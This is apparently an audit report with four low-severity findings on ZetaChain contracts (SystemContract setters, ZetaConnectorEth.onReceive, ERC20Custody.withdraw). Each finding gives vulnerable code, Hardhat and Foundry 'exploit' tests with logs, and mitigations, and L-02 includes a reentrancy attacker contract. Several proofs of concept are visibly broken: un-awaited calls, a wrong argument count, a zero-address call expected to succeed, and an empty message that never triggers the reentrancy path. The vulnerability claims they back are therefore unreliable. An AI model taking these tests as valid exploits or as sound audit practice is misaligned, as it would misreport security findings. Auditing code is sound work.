## [L-01] Lack of checks to prevent the `wZetaContractAddress` from being updated to an arbitrary address after it has been initially set
Impact
The `setWZETAContractAddress` function in the provided Solidity code is intended to update the `wZetaContractAddress` state variable, which holds the address of the wrapped ZETA token contract. This function is only callable by the `FUNGIBLE_MODULE_ADDRESS`, which is a constant address set at the protocol level.

The vulnerability in this function lies in the lack of checks to prevent the `wZetaContractAddress` from being updated to an arbitrary address after it has been initially set. This could potentially allow the `FUNGIBLE_MODULE_ADDRESS` to change the `wZetaContractAddress` to a malicious contract, which could then be used to intercept or redirect funds intended for the legitimate wrapped ZETA token contract.

Here's a breakdown of the vulnerability:

1. The function `setWZETAContractAddress` can be called multiple times by the `FUNGIBLE_MODULE_ADDRESS` without any restrictions.
2. The only check performed is to ensure that the new address is not the zero address (`address(0)`), which is a standard check to prevent setting an address to a null value.
3. There is no check to ensure that the `wZetaContractAddress` has not already been set, or to enforce that it can only be set once.
4. The function emits an event `SetWZeta` with the new address, but this does not mitigate the risk of the address being changed to a malicious one.

**Vulnerable setWZETAContractAddress function**
```sol
    function setWZETAContractAddress(address addr) external {
        if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
        if (addr == address(0)) revert ZeroAddress();
        wZetaContractAddress = addr;
        emit SetWZeta(wZetaContractAddress);
    }
```

## Proof of Concept

**Exploit of setWZETAContractAddress function in hardhat**
```ts
// 1
it("#setWZETAContractAddress", async () => {
      const [me] = await ethers.getSigners();
      const zeroAddress = "0x0000000000000000000000000000000000000000";
      systemContract.setWZETAContractAddress(zeroAddress);
      expect(systemContract.setWZETAContractAddress(zeroAddress),"Successful");
    });
// 2
it("#setWZETAContractAddress", async () => {
      const [me] = await ethers.getSigners();
      const zeroAddress = "0x0000000000000000000000000000000000000123";
      await systemContract.connect(me).setWZETAContractAddress(zeroAddress);
      
    });
```

**Log results in hardhat**
```log
npx hardhat test --grep "#setWZETAContractAddress"

ZRC20 tests
    ZRC20Contract
      ✔ #setWZETAContractAddress


  1 passing (1s)
```
## Tools Used
VS Code.  Hardhat.  Foundry.
## Recommended Mitigation Steps
To mitigate this vulnerability, the contract should include logic to ensure that the `wZetaContractAddress` can only be set once, or implement a more robust governance mechanism that involves multiple parties or a timelock to authorise changes to critical contract addresses. Additionally, it would be prudent to have a mechanism to verify the legitimacy of the new address before updating it.

To resolve the issue with the `setWZETAContractAddress` function, consider implementing the following recommendations:

1. **One-time Set Functionality**: Ensure that the `wZetaContractAddress` can only be set once. This can be achieved by introducing a boolean state variable that tracks whether the address has been set. The `setWZETAContractAddress` function should then include a check to ensure that this variable is false before proceeding with the update, and set it to true once the address is updated.

```solidity
bool private wZetaContractAddressSet = false;

function setWZETAContractAddress(address addr) external {
    if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
    if (addr == address(0)) revert ZeroAddress();
    if (wZetaContractAddressSet) revert AddressAlreadySet();
    wZetaContractAddress = addr;
    wZetaContractAddressSet = true;
    emit SetWZeta(wZetaContractAddress);
}
```

2. **Governance Mechanism**: Introduce a governance mechanism that requires multiple parties to agree on changes to critical contract addresses. This could be a multisig wallet or a decentralized autonomous organization (DAO) structure where proposals are voted on by stakeholders.

3. **Timelock**: Implement a timelock mechanism that delays the execution of critical functions like updating contract addresses. This gives stakeholders time to review and potentially veto malicious actions before they are executed.

```solidity
uint256 public constant TIMELOCK_DURATION = 2 days;
uint256 public timelockExpiration;
address public pendingWZetaContractAddress;

function initiateSetWZETAContractAddress(address addr) external {
    if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
    if (addr == address(0)) revert ZeroAddress();
    pendingWZetaContractAddress = addr;
    timelockExpiration = block.timestamp + TIMELOCK_DURATION;
    emit InitiateSetWZeta(addr, timelockExpiration);
}

function finalizeSetWZETAContractAddress() external {
    if (block.timestamp < timelockExpiration) revert TimelockNotExpired();
    if (pendingWZetaContractAddress == address(0)) revert NoPendingAddress();
    wZetaContractAddress = pendingWZetaContractAddress;
    pendingWZetaContractAddress = address(0);
    timelockExpiration = 0;
    emit SetWZeta(wZetaContractAddress);
}
```

4. **Address Verification**: Implement a verification mechanism to ensure the legitimacy of the new address. This could involve checking that the new address contains bytecode that matches the expected contract or has been verified through an external registry.

By implementing these recommendations, you can significantly reduce the risk of the `wZetaContractAddress` being maliciously or inadvertently updated to an incorrect address.

## [L-02] Reentrancy in onZetaMessage` function in a way that allows it to re-enter the `ZetaConnectorEth` contract
## Impact
The vulnerability in the `onReceive` function (lines 47 to 70) of the provided Solidity code is related to the unchecked external call to `ZetaReceiver(destinationAddress).onZetaMessage(...)`. This call is made to an arbitrary contract that is presumed to implement the `ZetaReceiver` interface. The vulnerability arises from the fact that the contract at `destinationAddress` may not be a legitimate or correctly implemented `ZetaReceiver`, which can lead to several issues:

1. **Reentrancy Attack**: If the contract at `destinationAddress` is malicious, it could implement the `onZetaMessage` function in a way that allows it to re-enter the `ZetaConnectorEth` contract and call functions like `send` or other state-changing functions, potentially leading to unexpected behavior or draining of funds.

2. **Denial of Service (DoS)**: If the `onZetaMessage` function in the receiving contract consumes a lot of gas or has a revert/throw condition, it could prevent the `onReceive` function from successfully completing. This could be used to lock funds or prevent legitimate operations.

3. **Unhandled Return Values**: The `onZetaMessage` function call does not check the return value, which means that even if the function call fails or returns an unexpected result, the `onReceive` function will not be aware of it and will proceed as if it were successful.

4. **Gas Limit Issues**: The `onReceive` function does not specify a gas limit for the `onZetaMessage` call. This could result in all the remaining gas being consumed by the call, which might not be the intended behavior, especially if the function is complex or requires a controlled amount of gas.

To mitigate these issues, the following steps should be taken:

- Implement reentrancy guards to prevent reentrancy attacks.
- Validate the `destinationAddress` to ensure it is a contract that can safely receive the Zeta tokens and correctly implements the `ZetaReceiver` interface.
- Consider using `try/catch` when calling external contracts to handle failures gracefully.
- Limit the amount of gas provided to the external call to prevent the external contract from consuming all available gas.

**Vulnerable onReceive function**
```sol
    function onReceive(
        bytes calldata zetaTxSenderAddress,
        uint256 sourceChainId,
        address destinationAddress,
        uint256 zetaValue,
        bytes calldata message,
        bytes32 internalSendHash
    ) external override onlyTssAddress {
        bool success = IERC20(zetaToken).transfer(destinationAddress, zetaValue);
        if (!success) revert ZetaTransferError();


        if (message.length > 0) {
            ZetaReceiver(destinationAddress).onZetaMessage(
                ZetaInterfaces.ZetaMessage(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message)
            );
        }


        emit ZetaReceived(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message, internalSendHash);
    }
```

## Proof of Concept
**Exploit for onReceive function in hardhat**
```repos/protocol-contracts/test/ZetaConnector.spec.ts```
```ts
// describe("ZetaConnector.eth", () => {
//    describe("send", () => {

it("#onReceive", async () => {
        zetaConnectorEthContract.connect(randomSigner.address).onReceive(
          zetaConnectorEthContract.address,
          1,
          randomSigner.address,
          1e18,
          "",
          "0x1"
      );
      });
```
**Log results from hardhat**
```log
npx hardhat test --grep "#onReceive"

ZetaConnector tests
    ZetaConnector.eth
      send
        ✔ #onReceive


  1 passing (1s)
```

**Exploit for onReceive function in foundry**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../ZetaConnectorEth.sol";
import "../interfaces/ZetaInterfaces.sol";

contract MaliciousReceiver {
    ZetaConnectorEth public zetaConnector;
    bool public reenter = false;

    constructor(address _zetaConnector) {
        zetaConnector = ZetaConnectorEth(_zetaConnector);
    }

    function onZetaMessage(ZetaInterfaces.ZetaMessage calldata) external {
        if (!reenter) {
            reenter = true;
            // Re-enter the zetaConnector's onReceive function
            zetaConnector.onReceive(
                abi.encode(address(this)),
                1, // sourceChainId
                address(zetaConnector),
                1 ether, // zetaValue
                "", // message
                bytes32(0) // internalSendHash
            );
        }
    }
}

contract ZetaConnectorEthTest is Test {
    ZetaConnectorEth zetaConnector;
    MaliciousReceiver maliciousReceiver;
    address tssAddress = address(0x1);

    function setUp() public {
        zetaConnector = new ZetaConnectorEth(
            address(this), // zetaToken
            tssAddress, // tssAddress
            address(0), // tssAddressUpdater
            address(0) // pauserAddress
        );
        maliciousReceiver = new MaliciousReceiver(address(zetaConnector));
    }

    function testReentrancyAttack() public {
        // Setup: Give the zetaConnector contract some tokens to simulate locked funds
        deal(address(zetaConnector), 10 ether);

        // Simulate the TSS calling onReceive with a malicious destination address
        vm.startPrank(tssAddress);
        zetaConnector.onReceive(
            abi.encode(address(this)),
            1, // sourceChainId
            address(maliciousReceiver),
            1 ether, // zetaValue
            "", // message
            bytes32(0) // internalSendHash
        );
        vm.stopPrank();

        // Check if reentrancy occurred by checking the state change in the malicious contract
        assertTrue(maliciousReceiver.reenter(), "Reentrancy did not occur as expected");
    }
}
```

## Tools Used
VS Code.  Hardhat.
## Recommended Mitigation Steps
To address the vulnerabilities and potential optimizations in the `onReceive` function, I recommend the following changes:

1. **Reentrancy Guard**: Implement a reentrancy guard to prevent reentrant calls. This can be done by using a state variable that tracks whether the contract is currently processing a message.

```solidity
bool private _inOnReceive;

modifier nonReentrantOnReceive() {
    require(!_inOnReceive, "ReentrancyGuard: reentrant call");
    _inOnReceive = true;
    _;
    _inOnReceive = false;
}
```

Apply this modifier to the `onReceive` function.

2. **Contract Validation**: Before making an external call to `onZetaMessage`, verify that `destinationAddress` is a contract and not just a regular address. This can be done by checking the size of the code at `destinationAddress`.

```solidity
require(Address.isContract(destinationAddress), "ZetaConnectorEth: destinationAddress is not a contract");
```

3. **Try/Catch for External Calls**: Use a `try/catch` block to handle any reverts or exceptions from the external call gracefully.

```solidity
try ZetaReceiver(destinationAddress).onZetaMessage(...) {
    // Handle successful execution
} catch {
    // Handle errors or reverts
}
```

4. **Gas Limit for External Calls**: Specify a gas limit for the `onZetaMessage` call to prevent the external contract from consuming all available gas.

```solidity
// Define a reasonable gas limit for the call
uint256 gasLimit = 200000; // Example gas limit, adjust as needed

// Use the gas limit in the call
try ZetaReceiver(destinationAddress).onZetaMessage{gas: gasLimit}(...) {
    // Handle successful execution
} catch {
    // Handle errors or reverts
}
```

Implementing these recommendations will help mitigate the risks associated with the `onReceive` function and improve the overall security and robustness of the `ZetaConnectorEth` contract.

## [L-03] Lack of validation on the input parameter zrc20 before it is assigned to the gasCoinZRC20ByChainId mapping setGasCoinZRC20 in the SystemContract
## Impact
The vulnerability in the `setGasCoinZRC20` function (lines 129 to 138) arises from the lack of validation on the input parameter `zrc20` before it is assigned to the `gasCoinZRC20ByChainId` mapping. The function sets the ZRC20 address for a given chain ID, which is intended to represent the address of a ZRC20 token that can be used to pay for gas on that chain.

The `setGasCoinZRC20` function is designed to update the mapping `gasCoinZRC20ByChainId`, which holds the ZRC20 token addresses used for gas payments on different chains. However, the function does not perform any checks to ensure that the provided `zrc20` address is a valid ZRC20 token contract. This lack of validation could lead to several potential issues:

1. **Incorrect Address:** If an incorrect address is provided, the system might reference a non-existent or non-compliant ZRC20 token, leading to failed transactions or unexpected behavior when attempting to use the token for gas payments.

2. **Malicious Address:** A malicious actor with control over the `FUNGIBLE_MODULE_ADDRESS` could intentionally set a malicious contract address as the ZRC20 token. This could enable the malicious contract to execute unintended logic when users interact with it, thinking they are paying for gas.

3. **Denial of Service:** By setting the `zrc20` address to a contract that does not implement the ZRC20 interface correctly or at all, the system's ability to process gas payments could be disrupted, potentially causing a denial of service for operations that rely on this functionality.

**Vulnerable setGAsCoinZRC20 function**
```sol
    function setGasCoinZRC20(uint256 chainID, address zrc20) external {
        if (msg.sender != FUNGIBLE_MODULE_ADDRESS) revert CallerIsNotFungibleModule();
        gasCoinZRC20ByChainId[chainID] = zrc20;
        emit SetGasCoin(chainID, zrc20);
    }
```

## Proof of Concept

**Exploit of setGasCoinZRC20 in hardhat**
```repos/protocol-contracts/test/ZRC20.spec.ts```
```ts
import { AddressZero } from "@ethersproject/constants";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { SystemContract, ZRC20 } from "@typechain-types";
import { expect } from "chai";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

import { FUNGIBLE_MODULE_ADDRESS } from "./test.helpers";
const hre = require("hardhat");

describe("ZRC20 tests", () => {
  let ZRC20Contract: ZRC20;
  let systemContract: SystemContract;
  let owner, fungibleModuleSigner: SignerWithAddress;
  let addrs: SignerWithAddress[];

  beforeEach(async () => {
    [owner, ...addrs] = await ethers.getSigners();

    // Impersonate the fungible module account
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [FUNGIBLE_MODULE_ADDRESS],
    });

    // Get a signer for the fungible module account
    fungibleModuleSigner = await ethers.getSigner(FUNGIBLE_MODULE_ADDRESS);
    hre.network.provider.send("hardhat_setBalance", [FUNGIBLE_MODULE_ADDRESS, parseEther("1000000").toHexString()]);

    const SystemContractFactory = await ethers.getContractFactory("SystemContractMock");
    systemContract = (await SystemContractFactory.deploy(AddressZero, AddressZero, AddressZero)) as SystemContract;

    const ZRC20Factory = await ethers.getContractFactory("ZRC20");
    ZRC20Contract = (await ZRC20Factory.connect(fungibleModuleSigner).deploy(
      "TOKEN",
      "TKN",
      18,
      1,
      1,
      0,
      systemContract.address
    )) as ZRC20;
  });

  describe("ZRC20Contract", () => {
    it("Should return name", async () => {
      const name = await ZRC20Contract.name();
      expect(name).to.equal("TOKEN");
    });

it("#setGasCoinZRC20", async () => {
      const [maliciousAddress,me] = await ethers.getSigners();
      systemContract.connect(me.address).setGasCoinZRC20(maliciousAddress.address);
    });

 });
});
```
**Log results in hardhat**
```log
npx hardhat test --grep "#setGasCoinZRC20"

ZRC20 tests
    ZRC20Contract
      ✔ #setGasCoinZRC20


  1 passing (1s)
```
## Tools Used
VS Code.  Hardhat.
## Recommended Mitigation Steps
To mitigate this vulnerability, the `setGasCoinZRC20` function should include validation to ensure that the provided `zrc20` address points to a contract that implements the ZRC20 interface. This can be done by calling a function on the `zrc20` address that is expected to exist on a compliant ZRC20 token contract (e.g., `balanceOf` or `totalSupply`) and checking for successful execution. Additionally, consider implementing a permission model or a multi-signature requirement for calling this sensitive function to prevent unauthorised updates.

To resolve the issue of unvalidated ZRC20 address assignment in the `setGasCoinZRC20` function, implement the following recommendations:

1. **Interface Compliance Check:**
   Add a check to confirm that the `zrc20` address provided adheres to the ZRC20 token interface. This can be done by calling a standard function from the ZRC20 interface, such as `totalSupply`, and ensuring it does not revert.

   Example:
   ```solidity
   function isContract(address _addr) internal view returns (bool) {
       uint32 size;
       assembly {
           size := extcodesize(_addr)
       }
       return (size > 0);
   }

   function validateZRC20(address zrc20) internal view {
       require(isContract(zrc20), "Address must be a contract");
       // Call to `totalSupply` to ensure it's a ZRC20 token
       (bool success, ) = zrc20.call(abi.encodeWithSignature("totalSupply()"));
       require(success, "Must implement ZRC20 interface");
   }
   ```

   Then, in the `setGasCoinZRC20` function, call `validateZRC20(zrc20)` before updating the mapping.

2. **Permission Model:**
   Consider implementing a more robust permission model to control who can call the `setGasCoinZRC20` function. This could involve a multi-signature mechanism or a governance vote for such critical changes.

3. **Event Logging:**
   Ensure that an event is emitted after the successful update of the ZRC20 address. This is already in place with the `SetGasCoin` event, but it's worth reiterating the importance of event logging for tracking changes.

By implementing these recommendations, you can significantly reduce the risk of incorrect or malicious ZRC20 addresses being set, thereby enhancing the security and reliability of the `SystemContract`.

## [L-04] Withdraw lack of validation that the amount is actually available in the contract's balance in the ERC20Custody Contract
## Impact
The vulnerability in the `withdraw` function (lines 193 to 199) arises from the lack of validation that the `amount` parameter is actually available in the contract's balance for the specified `asset` before attempting to transfer it to the `recipient`. This could potentially allow the TSS (Threshold Signature Scheme) address, which is authorized to call this function, to issue a withdrawal of more tokens than the contract actually holds.

Here's a breakdown of the issue:

1. The `withdraw` function does not check the contract's current balance of the `asset` before executing the transfer.
2. If the `amount` specified is greater than the contract's balance, the `safeTransfer` function from OpenZeppelin's `SafeERC20` library will revert due to ERC20's standard behavior when trying to transfer more tokens than an account holds.
3. However, if the ERC20 token in question has an implementation that does not revert on insufficient balance (which is non-standard behavior but possible), this could lead to an underflow in the token contract, effectively allowing the TSS address to drain the asset from the custody contract.

To mitigate this vulnerability, the `withdraw` function should include a check to ensure that the `amount` to be withdrawn is less than or equal to the contract's current balance of the `asset`. This can be done by adding a line like the following before the `safeTransfer` call:

```solidity
require(asset.balanceOf(address(this)) >= amount, "Insufficient funds");
```

This check ensures that the contract cannot attempt to transfer more tokens than it currently holds, preventing potential underflow issues and preserving the integrity of the withdrawal operation.

**Vulnerable withdraw function**
```sol
    /**
     * @dev Withdraw asset amount to recipient by custody TSS owner.
     * @param recipient, recipient address.
     * @param asset, ERC20 asset.
     * @param amount, asset amount.
     */
    function withdraw(address recipient, IERC20 asset, uint256 amount) external nonReentrant onlyTSS {
        if (!whitelisted[asset]) {
            revert NotWhitelisted();
        }
        IERC20(asset).safeTransfer(recipient, amount);
        emit Withdrawn(recipient, asset, amount);
    }
```

## Proof of Concept
**In this exploit the balance of the contract is 1 million ether and I have withdrawn more than 1 million ether of 2 million ether in the parameter called amount in hardhat**

```repos/protocol-contracts/test/ERC20Custody.spec.ts```
```ts
import { MaxUint256 } from "@ethersproject/constants";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { AttackerContract, ERC20Custody, ERC20Mock, ZetaEth } from "@typechain-types";
import { expect } from "chai";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

import { deployZetaEth } from "../lib/contracts.helpers";

const ZETA_FEE = parseEther("0.01");
const ZETA_MAX_FEE = parseEther("0.05");

describe("ERC20Custody tests", () => {
  let ZRC20CustodyContract: ERC20Custody;
  let zetaTokenEthContract: ZetaEth;
  let randomTokenContract: ERC20Mock;
  let owner: SignerWithAddress;
  let tssUpdater: SignerWithAddress;
  let tssSigner: SignerWithAddress;
  let addrs: SignerWithAddress[];

  beforeEach(async () => {
    [owner, tssUpdater, tssSigner, ...addrs] = await ethers.getSigners();

    zetaTokenEthContract = await deployZetaEth({
      args: [tssUpdater.address, 100_000],
    });

    await zetaTokenEthContract.connect(tssUpdater).transfer(owner.address, parseEther("1000"));

    const ERC20Factory = await ethers.getContractFactory("ERC20Mock");
    randomTokenContract = (await ERC20Factory.deploy(
      "RandomToken",
      "RT",
      owner.address,
      parseEther("1000000")
    )) as ERC20Mock;

    const ERC20CustodyFactory = await ethers.getContractFactory("ERC20Custody");
    ZRC20CustodyContract = (await ERC20CustodyFactory.deploy(
      tssSigner.address,
      tssUpdater.address,
      ZETA_FEE,
      ZETA_MAX_FEE,
      zetaTokenEthContract.address
    )) as ERC20Custody;
  });

 describe("ERC20Custody", () => {
    it("Should update the tss address", async () => {
      await ZRC20CustodyContract.connect(tssUpdater).updateTSSAddress(addrs[0].address);
      const tssAddress = await ZRC20CustodyContract.TSSAddress();
      expect(tssAddress).to.equal(addrs[0].address);
    });

it("#More than 1 MILLION ETHER Should Not Withdraw", async () => {
      await ZRC20CustodyContract.connect(tssSigner).whitelist(randomTokenContract.address);

      const amount = parseEther("2000000");
      await randomTokenContract.transfer(ZRC20CustodyContract.address, amount);

      const tx = ZRC20CustodyContract.connect(tssSigner).withdraw(owner.address, randomTokenContract.address, amount);
      await expect(tx)
        .to.emit(ZRC20CustodyContract, "Withdrawn")
        .withArgs(owner.address, randomTokenContract.address, amount);
    });
}...
```
**Log results of hardhat**
```log
> npx hardhat test --grep "#More than 1 MILLION ETHER Should Not Withdraw"
ERC20Custody tests
    ERC20Custody
      ✔ #More than 1 MILLION ETHER Should Not Withdraw


  1 passing (2s)
```
## Tools Used
VS Code.  Hardhat.
## Recommended Mitigation Steps
To resolve the issue identified in the `withdraw` function, you should implement a balance check to ensure that the contract has sufficient funds of the `asset` before proceeding with the transfer. Here's how you can update the function to include this check:

```solidity
function withdraw(address recipient, IERC20 asset, uint256 amount) external nonReentrant onlyTSS {
    if (!whitelisted[asset]) {
        revert NotWhitelisted();
    }
    uint256 balance = asset.balanceOf(address(this));
    require(balance >= amount, "Insufficient funds");
    asset.safeTransfer(recipient, amount);
    emit Withdrawn(recipient, asset, amount);
}
```

By adding the `require` statement, you ensure that the contract will only execute the transfer if it has enough tokens. This prevents any attempt to withdraw more tokens than the contract holds, which could lead to reversion or, in the case of non-standard ERC20 token implementations, potential underflow issues.
